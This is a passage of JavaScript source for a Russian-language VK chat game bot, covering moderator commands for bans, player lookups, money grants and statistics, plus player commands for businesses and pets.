	task += `\n⠀🚗 Машина: ${user.carname}`
}
if(user.yachtid > 0) {
	task += `\n⠀🛥 Яхта: ${user.yachtname}`
}
if(user.airplaneid > 0) {
	task += `\n⠀✈ Самолет: ${user.airplanename}`
}
if(user.helicopterid > 0) {
	task += `\n⠀🚁 Вертолет: ${user.helicoptername}`
}
if(user.homeid > 0) {
	task += `\n⠀🏠 Дом: ${user.homename}`
}
if(user.kvartiraid > 0) {
	task += `\n⠀🌇 Квартира: ${user.kvartiraname}`
}
if(user.biznesid > 0) {
	task += `\n⠀💼 Бизнес: ${user.biznesname}`
}
if(user.petid > 0) {
	task += `\n⠀${user.peticon} Питомец: ${user.petname}`
}
if(user.farmid > 0) { 
	if(user.farmid == 1) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
	if(user.farmid == 2) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
	if(user.farmid == 3) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
}

if(user.phoneid > 0) {
	task += `\n⠀📱 Телефон: ${user.phonename}`
}
let profile = `\n🔎 ID: ${base.id[context.senderId].id}`
if(user.rank == 2) profile += `\n🔥 V.i.P игрок`
if(user.rank == 3) profile += `\n🔮 Premium игрок`
if(user.rank == 4 && user.hide == false) profile += `\n🌀 Модератор`
if(user.rank > 4 && user.hide == false) profile += `\n👑 Администратор`
profile += `\n⭐ Опыта: ${user.exp}`
profile += `\n💰 Денег: ${utils.sp(user.balance)}$`
if(user.btc > 0) profile += `\n🌐 Биткоинов: ${utils.sp(user.btc)}`
profile += `\n👑 Рейтинг: ${utils.sp(user.rating)}`
if(task !== ``) profile += `\n\n🔑 Имущество: ${task}`
profile += `\n\n📗 Дата регистрации: ${user.reg}`
return context.send({message: `${nick}, твой профиль: ${profile}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📒 Профиль', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💰 Банк', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🌐 Биткоин', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🔋 Собрать биткоины', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      	[
      	Keyboard.textButton({ 
        label: '🎁 Получить бонус', 
        color: Keyboard.POSITIVE_COLOR,
        }),
        Keyboard.textButton({ 
        label: '◀ В главное меню', 
        color: Keyboard.SECONDARY_COLOR,
        })

        ]
     ])
     .inline(platform)

})
})

updates.hear(/getbaninfo ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = context.$match[1]
if(base.bs[task].banned == false) return context.send(`${nick}, пользователь не находится в бане! 😇`)
task = base.bs[context.$match[1]]
return context.send(`${nick}, пользователь *id${task.id} (${task.nick}) в бане на ${nols(task.bandays)}:${nols(task.banhours)}:${nols(task.banminutes)}:${nols(task.banseconds)} ⌚
⛔ Забанил: *id${base.bs[task.bannedby].id} (${base.bs[task.bannedby].nick})
❓ Причина: ${task.banreason}`)
	
})

updates.hear(/get ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let admtext = `${nick}, информация об игроке «*id${base.bs[context.$match[1]].id} (${base.bs[context.$match[1]].nick})»:`
let guser = base.bs[context.$match[1]]
let task = `` 
if(guser.carid > 0) {
	task += `\n⠀🚗 Машина: ${guser.carname}`
}
if(guser.yachtid > 0) {
	task += `\n⠀🛥 Яхта: ${guser.yachtname}`
}
if(guser.airplaneid > 0) {
	task += `\n⠀✈ Самолет: ${guser.airplanename}`
}
if(guser.helicopterid > 0) {
	task += `\n⠀🚁 Вертолет: ${guser.helicoptername}`
}
if(guser.homeid > 0) {
	task += `\n⠀🏠 Дом: ${guser.homename}`
}
if(guser.kvartiraid > 0) {
	task += `\n⠀🌇 Квартира: ${guser.kvartiraname}`
}
if(guser.biznesid > 0) {
	task += `\n⠀💼 Бизнес: ${guser.biznesname}`
}
if(guser.petid > 0) {
	task += `\n⠀${guser.peticon} Питомец: ${guser.petname}`
}
if(guser.farmid > 0) { 
	if(guser.farmid == 1) task += `\n⠀🔋 Ферма: ${guser.farmname} (x${utils.sp(guser.farms)})`
	if(guser.farmid == 2) task += `\n⠀🔋 Ферма: ${guser.farmname} (x${utils.sp(guser.farms)})`
	if(guser.farmid == 3) task += `\n⠀🔋 Ферма: ${guser.farmname} (x${utils.sp(guser.farms)})`
}
if(guser.phoneid > 0) {
	task += `\n⠀📱 Телефон: ${guser.phonename}`
}
let profile = `\n🔎 ID: ${base.id[guser.id].id}`
profile += `\n👀 Ник: ${guser.nick}`
profile += `\n?? ВК ид: ${guser.id}`
if(guser.rank == 2) profile += `\n🔥 V.i.P игрок`
if(guser.rank == 3) profile += `\n🔮 Premium игрок`
if(guser.rank == 4) profile += `\n🌀 Модератор`
if(guser.rank > 4) profile += `\n👑 Администратор`
profile += `\n💰 Денег: ${utils.sp(guser.balance)}$`
if(guser.btc > 0) profile += `\n🌐 Биткоинов: ${utils.sp(guser.btc)}`
profile += `\n👑 Рейтинг: ${utils.sp(guser.rating)}`
if(task !== ``) profile += `\n\n🔑 Имущество: ${task}`
if(guser.topenabled == true) profile += `\n👑 Топ: Включен`
if(guser.topenabled == false) profile += `\n👑 Топ: Выключен`
if(guser.bonus == 0) profile += `\n💎 Бонус: Доступен`
if(guser.bonus !== 0) profile += `\n💎 Бонус: Недоступен`
if(guser.notifications == true) profile += `\n🔔 Уведомления: Включены`
if(guser.notifications == false) profile += `\n🔔 Уведомления: Выключены`
if(guser.longnick == true) profile += `\n✍️ Длинный ник: Включен`
if(guser.longnick == false) profile += `\n✍️ Длинный Ник: Выключен`
profile += `\n📗 Дата регистрации: ${guser.reg}`
if(guser.payban == true) profile += `\n⛔ Бан передачи: Есть`
if(guser.payban == false) profile += `\n⛔ Бан передачи: Нет`
profile += `\n➡️ Последний раз передавал: ${guser.lastpay}`
profile +=`\n💲 Передал: ${guser.payalltime}`
if(guser.reportban == true) profile += `\n🆘 Бан репорта: Есть`
if(guser.reportban == false) profile += `\n🆘 Бан репорта: Нет`
if(guser.banned == false) profile += `\n❎ Забанен: Нет`
if(guser.banned == true) profile += `\n❎ Забанен: Да`
profile += `\n⌚Последняя активнось: ${guser.lastactivity}`
return context.send({message: `${admtext} ${profile}`
})
})


updates.hear(/банреп ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = base.bs[context.$match[1]]
if(task.reportban == false) {
	task.reportban = true
	vk.api.messages.send({user_id: task.id, message: `${nick} — заблокировал Вам возможность писать в репорт 🆘`})
	vk.api.messages.send({chat_id: adminchat, message: `${nick} — заблокировал *id${task.id} (Пользователю) возможность писать в репорт 🆘`})
	return context.send(`${nick}, *id${task.id} (Пользователю) отключена возможность писать в репорт 🆘`)
	
	}
	
	if(task.reportban == true) {
	task.reportban = false
	vk.api.messages.send({user_id: task.id, message: `${nick} — разблокировал Вам возможность писать в репорт 🆘`})
	vk.api.messages.send({chat_id: adminchat, message: `${nick} — разблокировал *id${task.id} (Пользователю) возможность писать в репорт 🆘`})
	return context.send(`${nick}, *id${task.id} (Пользователю) включена возможность писать в репорт 🆘`)
	
	}
	
})


updates.hear(/тбан ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = base.bs[context.$match[1]]
if(task.topenabled == false) {
	task.topenabled = true
	vk.api.messages.send({user_id: task.id, message: `${nick} — разблокировал Вам доступ к топу`})
	return context.send(`${nick}, Пользователю *id${task.id} (${task.nick}) — разблокирован топ`)
	
	}
if(task.topenabled == true) {
	task.topenabled = false
	vk.api.messages.send({user_id: task.id, message: `${nick} — заблокировал Вам доступ к топу`})
	return context.send(`${nick}, Пользователю *id${task.id} (${task.nick}) — заблокирован топ`)
	}

})

updates.hear(/пбан ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = base.bs[context.$match[1]]
if(task.payban == false) {
	task.payban = true
	vk.api.messages.send({user_id: task.id, message: `${nick} — заблокировал Вам доступ к передаче валюты`})
	return context.send(`${nick}, Пользователю *id${task.id} (${task.nick}) — заблокирована передача`)
	}
if(task.payban == true) {
	task.payban = false
	vk.api.messages.send({user_id: task.id, message: `${nick} — разблокировал Вам доступ к передаче валюты`})
	return context.send(`${nick}, Пользователю *id${task.id} (${task.nick}) — разблокирована передача`)
	}

})
updates.hear(/разбан ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = base.bs[context.$match[1]]
if(task.banned == false) return context.send(`${nick}, пользователь не находится в бане! ??`)
task.banned = false
task.banreason = ``
task.bandays = 0
task.banseconds = 0
task.banminutes = 0
task.banhours = 0
vk.api.messages.send({user_id: task.id, message: `🔔 Администратор ${nick} — разблокировал вас, приятной игры! 😇`})
return context.send(`${nick}, пользователь *id${task.id} (${task.nick}) разбанен.`)
})


updates.hear(/бан ([0-9]+) ([0-9]+)с (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = context.$match[1]
if(base.bs[context.$match[1]].banned == true) return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) уже находится в бане! 😯`)
let srok = context.$match[2]
base.bs[task].banseconds = Number(srok)
base.bs[task].banned = true
base.bs[task].bannedby = base.id[context.senderId].id
base.bs[task].banreason = `${context.$match[3]}`
vk.api.messages.send({user_id: base.bs[task].id, message: `🔔 Администратор *id${user.id} (${user.nick}) заблокировал вас на 00:00:00:${srok}\nПричина: ${context.$match[3]}`})
return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) заблокирован на 00:00:00:${srok}`)
})

updates.hear(/бан ([0-9]+) ([0-9]+)м (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = context.$match[1]
if(base.bs[context.$match[1]].banned == true) return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) уже находится в бане! 😯`)
let srok = context.$match[2]
base.bs[task].banminutes = Number(srok)
base.bs[task].banned = true
base.bs[task].bannedby = base.id[context.senderId].id
base.bs[task].banreason = `${context.$match[3]}`
vk.api.messages.send({user_id: base.bs[task].id, message: `🔔 Администратор *id${user.id} (${user.nick}) заблокировал вас на 00:00:${srok}:00\nПричина: ${context.$match[3]}`})
return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) заблокирован на 00:00:${srok}:00`)
})

updates.hear(/бан ([0-9]+) ([0-9]+)ч (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = context.$match[1]
if(base.bs[context.$match[1]].banned == true) return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) уже находится в бане! 😯`)
let srok = context.$match[2]
base.bs[task].banhours = Number(srok)
base.bs[task].banned = true
base.bs[task].bannedby = base.id[context.senderId].id
base.bs[task].banreason = `${context.$match[3]}`
vk.api.messages.send({user_id: base.bs[task].id, message: `🔔 Администратор *id${user.id} (${user.nick}) заблокировал вас на 00:${srok}:00:00\nПричина: ${context.$match[3]}`})
return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) заблокирован на 00:${srok}:00:00`)
})

updates.hear(/бан ([0-9]+) ([0-9]+)д (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = context.$match[1]
if(base.bs[context.$match[1]].banned == true) return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) уже находится в бане! 😯`)
let srok = context.$match[2]
base.bs[task].bandays = Number(srok)
base.bs[task].banned = true
base.bs[task].bannedby = base.id[context.senderId].id
base.bs[task].banreason = `${context.$match[3]}`
vk.api.messages.send({user_id: base.bs[task].id, message: `🔔 Администратор *id${user.id} (${user.nick}) заблокировал вас на ${srok}:00:00:00\nПричина: ${context.$match[3]}`})
return context.send(`${nick}, пользователь *id${base.bs[task].id} (${base.bs[task].nick}) заблокирован на ${srok}:00:00:00`)
})

updates.hear(/giv ([0-9]+) (.*)$/i,(context, ctx) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 5) return
if(user.tlgrmid < 1) return context.send(`${nick}, для использования данной команды тебе нужно привязать свой телеграмм 🌀`)
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
	 let res = context.$match[2]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
res = Number(res)
if(res < 1) return context.send(`${nick}, минимальная сумма выдачи — 1$ 😒`)
if(res > 1000000000000000) return context.send(`${nick}, слишком большая сумма выдачи 😒`)
let task = base.bs[context.$match[1]]
if(task.balance > Number(750000000000000)) return context.send(`${nick}, у данного игрока достигнут предел баланса 😒`)
let proverka = Number(context.$match[1])
if(proverka !== Number(base.id[context.senderId].id)) {
let limit = Number(user.givelimit)
limit += Number(res)
let maxlimit = 0
if(user.rank == 4) maxlimit += Number(5000000000000)
if(user.rank == 5) maxlimit += Number(50000000000000)
if(user.rank > 5) maxlimit += Number(500000000000000000)
if(user.givelimit == maxlimit) return context.send(`${nick}, достигнут лимит выдачи денег, Вы сможете выдавать через ${nols(Math.trunc(user.givetime / 60))}:00:00`)
if(user.givelimit > maxlimit) return context.send(`${nick}, достигнут лимит выдачи денег, Вы сможете выдавать через ${nols(Math.trunc(user.givetime / 60))}:00:00`)
let backlimit = maxlimit
backlimit -= Number(user.givelimit)
if(limit > Number(maxlimit)) {
	res = Number(backlimit)
}

}
user.tlgrmgivcount = Number(res)
user.tlgrmgivid = Number(context.$match[1])
let rid = getRandomInRange(1, 500000)

telegram.sendMessage(user.tlgrmid, `> создан новый запрос на выдачу
👤 Кому выдача: ${task.nick}
💰 Сумма выдачи: ${utils.sp(res)}
⛱ ID выдачи: ${rid} 

[✅]-> подтвердите выдачу командой /sendgiv 🌀`)
return context.send(`${nick}, создан новый запрос на выдачу
👤 Кому выдача: ${task.nick}
💰 Сумма выдачи: ${utils.sp(res)}
⛱ ID выдачи: ${rid} 

[✅]-> подтвердите выдачу в Telegram 🌀`)
})

updates.hear(/статистика$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let top = []
let topenab = []
let btc = []
if(user.rank < 4) return
let blocked = 0
for(let b in base.bs){
if(base.bs[b].banned == true){
blocked += Number(1)
}
}
let balance = 0
for(let a in base.bs){
	balance += Number(base.bs[a].balance)
}
	let bank = 0
	let farms = 0
	let rate = 0
for(let i in base.bs){
	if(base.bs[i].btc !== 0 || base.bs[i].btc !== null || base.bs[i].btc !== undefined){
		btc.push({
			id: base.bs[i].id,
			balance: base.bs[i].btc
		})
	}
}
for(let n in base.bs){
	bank += Number(base.bs[n].bank)
	farms += Number(base.bs[n].farms)
	rate += Number(base.bs[n].rating)
}
for(let i in base.bs){
	if(base.bs[i].topenabled == false){
		top.push({
			id: base.bs[i].id,
			balance: base.bs[i].balance
		})
	}
	if(base.bs[i].topenabled == true){
		topenab.push({
			id: base.bs[i].id,
			balance: base.bs[i].balance
		})
	}
}
top.sort(function(a, b) { 
	if (b.balance > a.balance) return 1 
	if (b.balance < a.balance) return -1 
return 0
});
btc.sort(function(a, b) { 
	if (b.balance > a.balance) return 1 
	if (b.balance < a.balance) return -1 
return 0
});
topenab.sort(function(a, b) { 
	if (b.balance > a.balance) return 1 
	if (b.balance < a.balance) return -1 
return 0
});

return context.send(`Статистика:
😸 Всего игроков: ${base.context.id}
⛔ Заблокировано: ${blocked}
💰 Сумма всех денег игроков: ${utils.sp(balance)}$
💳 Сумма всех денег в банке игроков: ${utils.sp(bank)}$
🔋 Сумма всех ферм игроков: ${utils.sp(farms)}
👑 Сумма всего рейтинга игроков: ${utils.sp(rate)}
🔱 Самый богатый игрок[TOPFALSE]: *id${top[0].id} (${base.bs[base.id[top[0].id].id].nick}) (${base.id[top[0].id].id}) >> ${utils.sp(top[0].balance)}$
🔱 Самый богатый игрок[TOPTRUE]: *id${topenab[0].id} (${base.bs[base.id[topenab[0].id].id].nick}) (${base.id[topenab[0].id].id}) >> ${utils.sp(topenab[0].balance)}$
🔱 Самое большое кол-во биткоинов у: *id${btc[0].id} (${base.bs[base.id[btc[0].id].id].nick}) (${base.id[btc[0].id].id}) >> ${utils.sp(btc[0].balance)}
`)
})


updates.hear(/бизнесы 2$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = ``
for(let o in biznesi){
if(biznesi[o].id > 10 && biznesi[o].id !== 21){
text += `\n🔸${biznesi[o].id}. ${biznesi[o].name} — ${utils.sp(biznesi[o].cost)}$\n⠀💰 Прибыль: ${utils.sp(biznesi[o].pribil)}$/час`
}
}
return context.send(`${nick}, бизнесы: ${text}\n\n💼 «бизнесы 1», для просмотра пред.страницы.\n💡Вы можете иметь только ОДИН бизнес!\n🛒 Для покупки введите "Бизнес [номер]"`)

})

updates.hear(/бизнесы|бизнесы 1$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = ``
for(let o in biznesi){
if(biznesi[o].id < 11){
text += `\n🔸${biznesi[o].id}. ${biznesi[o].name} — ${utils.sp(biznesi[o].cost)}$\n⠀💰 Прибыль: ${utils.sp(biznesi[o].pribil)}$/час`
}
}
return context.send(`${nick}, бизнесы: ${text}\n\n💼 «бизнесы 2», для просмотра след.страницы.\n💡Вы можете иметь только ОДИН бизнес!\n🛒 Для покупки введите "Бизнес [номер]"`)

})


updates.hear(/бизнес ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.biznesid > 0) return context.send(`${nick}, у Вас уже есть бизнес (${user.biznesname})! 🙌\nчтобы продать его отправьте «Продать бизнес»`)
let biz = context.$match[1]
if(biz > 20) return context.send(`${nick}, такого бизнеса не существует 😮`)
if(biz < 1) return context.send(`${nick}, такого бизнеса не существует 😮`)
for(let b in biznesi){
if(biznesi[b].id == biz){
if(user.balance < Number(biznesi[b].cost)){
return context.send(`${nick}, у вас недостаточно денег ☹`)
}
user.balance -= Number(biznesi[b].cost)
user.biznesid = Number(biznesi[b].id)
user.biznespribil = Number(biznesi[b].pribil)
user.biznesname = `${biznesi[b].name}`
user.biznesworkers = Number(0)
user.biznesmaxworkers = Number(biznesi[b].workers)
return context.send(`${nick}, вы купили «${biznesi[b].name}» за ${utils.sp(biznesi[b].cost)}$ 👍`)


}
}
	
})

updates.hear(/(беседа кик)\s(.*)/i, async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.chatId === 8){
		if(user.kickbesedaadm === 0) return 
		let res = context.$match[2]
		while(res.includes(`vk.com/id`)){
		res = res.replace(`vk.com/id`,``)
		}
		while(res.includes(`/`)){
			res = res.replace(`/`,``)
		}
		while(res.includes(`https:`)){
			res = res.replace(`https:`,``)
		}
		while(res.includes(`vk.com`)){
			res = res.replace(`vk.com`,``)
		}
		let users = await vk.api.messages.getConversationMembers({peer_id: context.peerId});
	}
	if(context.chatId === 19){
		if(user.kickbeseda === 0) return
		let res = context.$match[2]
		while(res.includes(`vk.com/id`)){
		res = res.replace(`vk.com/id`,``)
		}
		while(res.includes(`/`)){
			res = res.replace(`/`,``)
		}
		while(res.includes(`https:`)){
			res = res.replace(`https:`,``)
		}
		while(res.includes(`vk.com`)){
			res = res.replace(`vk.com`,``)
		}
		let users = await vk.api.messages.getConversationMembers({peer_id: context.peerId});
	}
	return
})

updates.hear(/бизнес снять$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.biznesid < 1) return context.send(`${nick}, у Вас нет бизнеса, напиши «бизнесы [1/2]», чтобы посмотреть доступные бизнесы 😒`)
if(user.biznesmoney < Number(1)) return context.send(`${nick}, у вас нет денег на счёте этого бизнеса 😩`)
let plus = Number(user.biznesmoney)
user.balance += Number(plus)
user.biznesmoney = Number(0)
return context.send(`${nick}, вы сняли ${utils.sp(plus)}$ со счёта своего бизнеса 🤑`)
})

updates.hear(/бизнес нанять$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.biznesid < 1) return context.send(`${nick}, у Вас нет бизнеса, напиши «бизнесы [1/2]», чтобы посмотреть доступные бизнесы 😒`)
if(user.biznesworkers == user.biznesmaxworkers) return context.send(`${nick}, Вы уже имеете макс.колво работников 😒`)
let colvo = user.biznesmaxworkers
colvo *= Number(1000)
if(user.balance < Number(colvo)) return context.send(`${nick}, вам не хватает ${utils.sp(colvo)}$ для найма рабочих 😮`)
user.balance -= Number(colvo)
user.biznesworkers = Number(user.biznesmaxworkers)

	return context.send(`${nick}, вы наняли ${user.biznesmaxworkers} человек себе на работу ☺`)
	
})
updates.hear(/бизнес$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.biznesid < 1) return context.send(`${nick}, у Вас нет бизнеса, напиши «бизнесы [1/2]», чтобы посмотреть доступные бизнесы 😒`)
let needworkers = ``
let pribil = user.biznespribil
if(user.biznesworkers !== user.biznesmaxworkers) {
	needworkers = `‼️ У вас работает мало людей. Прибыль уменьшена в 2 раза. Введите «Бизнес нанять» для найма!`
	pribil /= Number(2)
	pribil = Math.trunc(pribil)
	}



return context.send(`${nick}, статистика «${user.biznesname}»:
💸 Прибыль: ${utils.sp(pribil)}$/час
💼 Рабочих: ${user.biznesworkers}/${user.biznesmaxworkers}
💰 На счёте: ${utils.sp(user.biznesmoney)}$

${needworkers}
`)
})


updates.hear(/питомцы$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in pets){
if(pets[o].id !== 9){
	list += `\n🔸 ${pets[o].icon} ${pets[o].id}. ${pets[o].name} (${utils.sp(pets[o].cost)}$)`	
}
}
return context.send(`${nick}, питомцы: ${list}\n\n❓ Для покупки введите «питомец [номер]»\n📃 Информация о вашем питомце: «Питомец»\n🛒 Для продажи введите: «Продать питомца»`)
})

updates.hear(/питомец поход$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.petid < 1) return context.send(`${nick}, у Вас нет питомца, отправьте «питомцы» чтобы получить список всех питомцев.`)
